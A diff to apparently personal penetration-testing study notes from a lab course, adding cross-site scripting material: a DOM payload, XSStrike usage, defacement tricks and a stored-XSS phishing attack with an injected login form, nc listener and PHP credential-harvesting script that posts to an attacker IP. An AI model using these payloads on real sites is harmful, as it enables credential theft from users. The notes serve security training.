@@ -1,4 +1,4 @@
-1## SQL Injection (SQLi)
+## SQL Injection (SQLi)
 *Lots of webpages store data in SQL databases. If they don't sanitize user inputs, then it is possible to query the database from an input field *
 
 Connect to SQL
@@ -253,14 +253,79 @@ To verify code has been ran successfully:
 2. Check inspect elements and see if the payload has been inserted into the webpage
 For a specific value in a page like a `cookie`, use `document.cookie`
 
+For more see [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) and the [PayloadBox](https://github.com/payloadbox/xss-payload-list) 
+
 **Reflected (Non-Persistent)**
 *This is when XSS code is ran server-side and not stored*
 
 **DOM**
 *This is when XSS code is ran directly into the browser and not stored*
+```
+<img src="" onerror=alert(window.origin)>
+```
+It's the same type of stuff, it just functions a little different.
 
 **Discovery**
+*Some scanners can detect the presence of XSS, like Burp, ZAP, and Nessus*
+Some open source tools that an help are:
+- XSS Strike
+- Brute XSS
+- XSSer
+The basic XSS Strike syntax is 
+```
+python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
+```
+**Defacement**
+Four main elements to change 
+- Background Color `document.body.style.background`
+- Background `document.body.background`
+- Page Title `document.title`
+- Page Text `DOM.innerHTML`
+
 **Phishing**
+These work best with `Stored XSS` attacks. One basic example is injecting a form into a webpage that is stored, so that we can steal credentials.
+```html
+<h3>Please login to continue</h3>
+<form action=http://OUR_IP>
+    <input type="username" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <input type="submit" name="submit" value="Login">
+</form>
+```
+As a XSS payload that would look like this 
+```
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+```
+To remove an element run
+```
+document.getElementById('<element>').remove();
+```
+To connect to the listener
+```
+sudo nc -lvnp 80
+```
+The following PHP script should do what we need, and we will write it to a file on our VM that we'll call `index.php` and place it in `/tmp/tmpserver/` (`don't forget to replace SERVER_IP with the ip from our exercise`):
+```php
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php");
+    fclose($file);
+    exit();
+}
+?>
+```
+Then run 
+```shell-session
+Enigma3nma@htb[/htb]$ mkdir /tmp/tmpserver
+Enigma3nma@htb[/htb]$ cd /tmp/tmpserver
+Enigma3nma@htb[/htb]$ vi index.php #at this step we wrote our index.php file
+Enigma3nma@htb[/htb]$ sudo php -S 0.0.0.0:80
+PHP 7.4.15 Development Server (http://0.0.0.0:80) started
+```
+
+![[../../Cross_Site_Scripting_Xss_Module_Cheat_Sheet.pdf]]
 **Hijacking**
 
 
